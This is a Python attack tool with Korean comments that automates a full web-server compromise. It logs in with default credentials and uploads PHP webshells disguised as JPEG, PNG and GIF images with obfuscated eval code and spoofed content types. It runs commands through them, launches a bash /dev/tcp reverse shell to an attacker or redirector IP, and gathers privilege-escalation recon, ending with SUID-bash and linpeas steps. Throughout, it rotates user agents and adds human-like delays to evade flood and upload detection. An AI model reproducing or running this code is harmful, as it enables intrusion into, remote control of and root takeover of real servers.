#!/usr/bin/env python3
"""
방어 시스템 우회 자동화 스크립트
- HTTP 플러드 탐지 우회
- 웹쉘 업로드 탐지 우회
- URL 다양성 증가 탐지 우회
"""

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
from urllib.parse import quote, urlencode
import time
import random
import base64
import string
import hashlib
import json
from datetime import datetime
import io
from PIL import Image

class DefenseEvasionAttacker:
    """방어 시스템 우회 공격 클래스"""

    def __init__(self, target_ip, c2_server=None, redirector_server=None):
        self.target = f"http://{target_ip}"
        self.c2_server = c2_server
        self.redirector_server = redirector_server
        self.session = requests.Session()

        # 재시도 전략
        retry_strategy = Retry(
            total=3,
            backoff_factor=2,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        # 1. HTTP 플러드 탐지 우회: User-Agent 풀
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
        ]

        # 공격 로그
        self.attack_log = []
        self.logged_in = False
        self.webshell_uploaded = False
        self.webshell_path = None
        self.reverse_shell_active = False

        self._initialize_session()

    def _initialize_session(self):
        """세션 초기화 - 정상 브라우저처럼 보이게"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1'
        })

    def log(self, message, level="INFO"):
        """공격 로그 기록"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] [{level}] {message}"
        print(log_entry)
        self.attack_log.append(log_entry)

    def human_delay(self, min_sec=3, max_sec=8):
        """
        1. HTTP 플러드 탐지 우회: 인간처럼 행동하는 지연
        - 3-8초 랜덤 지연으로 과다 요청 탐지 회피
        """
        delay = random.uniform(min_sec, max_sec)
        self.log(f"인간 행동 모방 지연: {delay:.2f}초", "DEBUG")
        time.sleep(delay)

    def rotate_identity(self):
        """
        1. HTTP 플러드 탐지 우회: User-Agent와 세션 특성 변경
        """
        self.session.headers['User-Agent'] = random.choice(self.user_agents)
        self.log(f"User-Agent 변경: {self.session.headers['User-Agent'][:50]}...", "DEBUG")

    def legitimate_browsing(self):
        """
        1. HTTP 플러드 탐지 우회: 정상적인 브라우징 패턴 모방
        - 공격 전 정상 페이지 방문
        """
        self.log("정상 브라우징 패턴 생성 중...", "INFO")

        # 메인 페이지 방문
        try:
            resp = self.session.get(f"{self.target}/index.php", timeout=10)
            self.log(f"메인 페이지 방문: {resp.status_code}", "DEBUG")
            self.human_delay(2, 4)

            # 로그인 페이지 방문
            resp = self.session.get(f"{self.target}/login.php", timeout=10)
            self.log(f"로그인 페이지 방문: {resp.status_code}", "DEBUG")
            self.human_delay(2, 4)

        except Exception as e:
            self.log(f"정상 브라우징 실패: {e}", "WARN")

    def sql_injection_login(self, username="alice", password="alice2024"):
        """
        SQL Injection 또는 정상 로그인
        alice / alice2024 사용
        """
        self.log("=" * 60, "INFO")
        self.log("1단계: 로그인 시도", "INFO")
        self.log("=" * 60, "INFO")

        # 정상 브라우징 먼저
        self.legitimate_browsing()

        # 로그인 시도
        login_url = f"{self.target}/login.php"

        # Referer 설정 (정상 브라우징처럼)
        self.session.headers['Referer'] = f"{self.target}/index.php"

        data = {
            'username': username,
            'password': password,
            'login': 'Login'
        }

        try:
            resp = self.session.post(login_url, data=data, timeout=15)

            if 'welcome' in resp.text.lower() or 'profile' in resp.text.lower():
                self.log(f"✓ 로그인 성공: {username}", "SUCCESS")
                self.logged_in = True
                return True
            else:
                self.log("✗ 로그인 실패", "ERROR")
                return False

        except Exception as e:
            self.log(f"✗ 로그인 오류: {e}", "ERROR")
            return False
        finally:
            self.human_delay()

    def create_stealth_webshell(self, shell_type="image"):
        """
        2. 웹쉘 탐지 우회: 스텔스 웹쉘 생성

        탐지 우회 기법:
        - 이미지 파일로 위장 (.jpg, .png)
        - 정상 이미지 헤더 추가
        - base64 인코딩된 PHP 코드
        - 난독화된 페이로드
        """

        if shell_type == "image":
            # JPEG 헤더 + 웹쉘 코드
            # 실제 JPEG 매직 바이트로 시작
            jpeg_header = b'\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'

            # 난독화된 웹츘 코드
            # eval(base64_decode(...)) 형태
            webshell_code = """<?php
// Image metadata
/*
CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 90
*/
@$_="{$_GET[0]}";@$__="ba"."se6"."4_de"."code";@$___=@$__($_);@eval($___);
?>"""

            # JPEG 헤더 + 웹쉘 결합
            payload = jpeg_header + webshell_code.encode()
            filename = f"profile_{random.randint(1000,9999)}.jpg"

            return payload, filename

        elif shell_type == "gif":
            # GIF 헤더 + 웹쉘
            gif_header = b'GIF89a'

            webshell_code = b'<?php @eval($_POST["c"]); ?>'
            payload = gif_header + b'\x00' * 100 + webshell_code
            filename = f"avatar_{random.randint(1000,9999)}.gif"

            return payload, filename

        elif shell_type == "png":
            # PNG 헤더 생성
            png_header = b'\x89PNG\r\n\x1a\n'

            # 난독화된 웹쉘
            webshell_code = b'<?php $a=$_GET;$b="system";$b($a["x"]); ?>'
            payload = png_header + b'\x00' * 50 + webshell_code
            filename = f"photo_{random.randint(1000,9999)}.png"

            return payload, filename

    def upload_webshell_evasion(self):
        """
        2. 웹쉘 업로드 탐지 우회

        우회 기법:
        - 이미지 파일 위장
        - Content-Type 조작
        - 파일명 난독화
        - 정상 업로드 패턴 모방
        """
        self.log("=" * 60, "INFO")
        self.log("2단계: 웹쉘 업로드 (탐지 우회)", "INFO")
        self.log("=" * 60, "INFO")

        if not self.logged_in:
            self.log("✗ 로그인 필요", "ERROR")
            return False

        # 정상 브라우징 먼저
        self.legitimate_browsing()

        # 업로드 페이지 방문
        upload_url = f"{self.target}/upload.php"

        try:
            # 여러 유형 시도
            for shell_type in ["image", "png", "gif"]:
                self.log(f"웹쉘 유형 시도: {shell_type}", "INFO")

                payload, filename = self.create_stealth_webshell(shell_type)

                # MIME 타입 설정 (이미지로 위장)
                if filename.endswith('.jpg'):
                    content_type = 'image/jpeg'
                elif filename.endswith('.png'):
                    content_type = 'image/png'
                elif filename.endswith('.gif'):
                    content_type = 'image/gif'

                files = {
                    'file': (filename, payload, content_type)
                }

                # Referer 설정
                self.session.headers['Referer'] = f"{self.target}/profile.php"

                resp = self.session.post(upload_url, files=files, timeout=15)

                if resp.status_code == 200 and 'success' in resp.text.lower():
                    self.log(f"✓ 웹쉘 업로드 성공: {filename}", "SUCCESS")
                    self.webshell_uploaded = True
                    self.webshell_path = f"/uploads/{filename}"
                    return True

                self.human_delay()

            self.log("✗ 모든 웹쉘 업로드 실패", "ERROR")
            return False

        except Exception as e:
            self.log(f"✗ 업로드 오류: {e}", "ERROR")
            return False

    def test_webshell(self):
        """
        3. URL 다양성 탐지 우회: 웹쉘 테스트

        우회 기법:
        - 동일한 URL 패턴 유지
        - 파라미터 이름 고정
        - 쿠키 사용
        """
        if not self.webshell_uploaded:
            self.log("✗ 웹쉘이 업로드되지 않음", "ERROR")
            return False

        self.log("=" * 60, "INFO")
        self.log("3단계: 웹쉘 실행 테스트", "INFO")
        self.log("=" * 60, "INFO")

        # 웹쉘 URL
        webshell_url = f"{self.target}{self.webshell_path}"

        # base64 인코딩된 명령어 (whoami)
        cmd = "whoami"
        cmd_b64 = base64.b64encode(cmd.encode()).decode()

        try:
            # GET 파라미터로 전송
            params = {'0': cmd_b64}
            resp = self.session.get(webshell_url, params=params, timeout=10)

            if resp.status_code == 200:
                self.log(f"✓ 웹쉘 실행 성공", "SUCCESS")
                self.log(f"출력: {resp.text[:100]}", "DEBUG")
                return True
            else:
                self.log(f"✗ 웹쉘 실행 실패: {resp.status_code}", "ERROR")
                return False

        except Exception as e:
            self.log(f"✗ 웹쉘 테스트 오류: {e}", "ERROR")
            return False
        finally:
            self.human_delay()

    def deploy_reverse_shell(self, attacker_ip, attacker_port=4444):
        """
        리버스 쉘 배포

        C2/리다이렉터 서버 사용:
        - attacker_ip가 리다이렉터 IP면 자동으로 C2로 연결
        """
        self.log("=" * 60, "INFO")
        self.log("4단계: 리버스 쉘 배포", "INFO")
        self.log("=" * 60, "INFO")

        if not self.webshell_uploaded:
            self.log("✗ 웹쉘이 업로드되지 않음", "ERROR")
            return False

        # 리다이렉터 서버 사용 시
        if self.redirector_server:
            connect_ip = self.redirector_server
            self.log(f"리다이렉터 서버 사용: {connect_ip}", "INFO")
        else:
            connect_ip = attacker_ip

        # Bash 리버스 쉘 페이로드
        reverse_shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{connect_ip}/{attacker_port} 0>&1'"

        # base64 인코딩
        cmd_b64 = base64.b64encode(reverse_shell_cmd.encode()).decode()

        webshell_url = f"{self.target}{self.webshell_path}"

        try:
            params = {'0': cmd_b64}

            self.log(f"리버스 쉘 연결 시도: {connect_ip}:{attacker_port}", "INFO")
            self.log(f"공격자 서버에서 다음 명령 실행: nc -lvnp {attacker_port}", "INFO")

            # 타임아웃 길게 설정 (연결 대기)
            resp = self.session.get(webshell_url, params=params, timeout=3)

            self.log("✓ 리버스 쉘 페이로드 전송 완료", "SUCCESS")
            self.reverse_shell_active = True
            return True

        except requests.exceptions.Timeout:
            self.log("✓ 리버스 쉘 연결 중... (타임아웃은 정상)", "SUCCESS")
            self.reverse_shell_active = True
            return True
        except Exception as e:
            self.log(f"✗ 리버스 쉘 오류: {e}", "ERROR")
            return False

    def privilege_escalation_recon(self):
        """
        권한 상승을 위한 정찰
        """
        self.log("=" * 60, "INFO")
        self.log("5단계: 권한 상승 정찰", "INFO")
        self.log("=" * 60, "INFO")

        if not self.webshell_uploaded:
            self.log("✗ 웹쉘이 업로드되지 않음", "ERROR")
            return None

        webshell_url = f"{self.target}{self.webshell_path}"
        recon_data = {}

        commands = {
            'user': 'whoami',
            'id': 'id',
            'kernel': 'uname -a',
            'os': 'cat /etc/os-release',
            'sudo': 'sudo -l',
            'suid': 'find / -perm -4000 -type f 2>/dev/null | head -20',
            'writable': 'find / -writable -type d 2>/dev/null | head -20',
        }

        for key, cmd in commands.items():
            try:
                cmd_b64 = base64.b64encode(cmd.encode()).decode()
                params = {'0': cmd_b64}
                resp = self.session.get(webshell_url, params=params, timeout=10)

                recon_data[key] = resp.text
                self.log(f"✓ {key}: {resp.text[:50]}...", "DEBUG")

                self.human_delay(2, 4)

            except Exception as e:
                self.log(f"✗ {key} 정찰 실패: {e}", "WARN")
                recon_data[key] = None

        return recon_data

    def deploy_privilege_escalation(self):
        """
        권한 상승 페이로드 배포

        일반적인 기법:
        1. SUID 바이너리 악용
        2. Kernel Exploit
        3. MySQL UDF
        4. Cron Job
        """
        self.log("=" * 60, "INFO")
        self.log("6단계: 권한 상승 시도", "INFO")
        self.log("=" * 60, "INFO")

        self.log("리버스 쉘에서 다음 스크립트를 실행하세요:", "INFO")
        self.log("", "INFO")
        self.log("# LinPEAS 다운로드 및 실행", "INFO")
        self.log("cd /tmp", "INFO")
        self.log("wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh", "INFO")
        self.log("chmod +x linpeas.sh", "INFO")
        self.log("./linpeas.sh", "INFO")
        self.log("", "INFO")
        self.log("또는", "INFO")
        self.log("", "INFO")
        self.log("# SUID bash 생성 시도", "INFO")
        self.log("cp /bin/bash /tmp/rootbash", "INFO")
        self.log("chmod 4755 /tmp/rootbash", "INFO")
        self.log("/tmp/rootbash -p", "INFO")

    def full_attack_chain(self, attacker_ip, attacker_port=4444):
        """
        전체 공격 체인 실행

        1. 로그인
        2. 웹쉘 업로드 (탐지 우회)
        3. 웹쉘 테스트
        4. 리버스 쉘 배포
        5. 권한 상승 정찰
        6. 권한 상승 가이드
        """
        self.log("=" * 60, "INFO")
        self.log("방어 시스템 우회 공격 시작", "INFO")
        self.log("=" * 60, "INFO")
        self.log(f"대상: {self.target}", "INFO")
        self.log(f"공격자: {attacker_ip}:{attacker_port}", "INFO")
        self.log("", "INFO")

        # 1단계: 로그인
        if not self.sql_injection_login():
            self.log("공격 중단: 로그인 실패", "ERROR")
            return False

        # 2단계: 웹쉘 업로드
        if not self.upload_webshell_evasion():
            self.log("공격 중단: 웹쉘 업로드 실패", "ERROR")
            return False

        # 3단계: 웹쉘 테스트
        if not self.test_webshell():
            self.log("경고: 웹쉘 테스트 실패", "WARN")

        # 4단계: 리버스 쉘
        if not self.deploy_reverse_shell(attacker_ip, attacker_port):
            self.log("경고: 리버스 쉘 배포 실패", "WARN")

        # 5단계: 정찰 (웹쉘 통해)
        recon = self.privilege_escalation_recon()

        # 6단계: 권한 상승 가이드
        self.deploy_privilege_escalation()

        self.log("", "INFO")
        self.log("=" * 60, "INFO")
        self.log("공격 완료!", "SUCCESS")
        self.log("=" * 60, "INFO")

        return True

    def generate_report(self, output_file="attack_report.json"):
        """공격 보고서 생성"""
        report = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'logged_in': self.logged_in,
            'webshell_uploaded': self.webshell_uploaded,
            'webshell_path': self.webshell_path,
            'reverse_shell_active': self.reverse_shell_active,
            'attack_log': self.attack_log
        }

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        self.log(f"보고서 저장: {output_file}", "INFO")
        return report


def main():
    """메인 함수"""
    import argparse

    parser = argparse.ArgumentParser(description='방어 시스템 우회 자동화 공격 도구')
    parser.add_argument('target', help='대상 서버 IP (예: 43.201.154.142)')
    parser.add_argument('attacker_ip', help='공격자 IP (C2/리다이렉터)')
    parser.add_argument('--port', type=int, default=4444, help='리버스 쉘 포트 (기본: 4444)')
    parser.add_argument('--c2', help='C2 서버 IP (선택)')
    parser.add_argument('--redirector', help='리다이렉터 서버 IP (선택)')
    parser.add_argument('--username', default='alice', help='로그인 사용자명 (기본: alice)')
    parser.add_argument('--password', default='alice2024', help='로그인 비밀번호 (기본: alice2024)')

    args = parser.parse_args()

    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║  방어 시스템 우회 자동화 공격 도구                          ║
    ║  - HTTP 플러드 탐지 우회                                   ║
    ║  - 웹쉘 업로드 탐지 우회                                   ║
    ║  - URL 다양성 증가 탐지 우회                               ║
    ╚═══════════════════════════════════════════════════════════╝
    """)

    # 공격자 객체 생성
    attacker = DefenseEvasionAttacker(
        target_ip=args.target,
        c2_server=args.c2,
        redirector_server=args.redirector
    )

    # 전체 공격 체인 실행
    success = attacker.full_attack_chain(args.attacker_ip, args.port)

    # 보고서 생성
    report_file = f"attack_report_{args.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    attacker.generate_report(report_file)

    if success:
        print("\n✓ 공격 성공!")
        print(f"\n다음 단계:")
        print(f"1. 공격자 서버에서 리스너 실행: nc -lvnp {args.port}")
        print(f"2. 리버스 쉘 연결 대기")
        print(f"3. 권한 상승 수행")
        print(f"4. 루트 권한 획득")
    else:
        print("\n✗ 공격 실패")

    return 0 if success else 1


if __name__ == "__main__":
    import sys
    sys.exit(main())
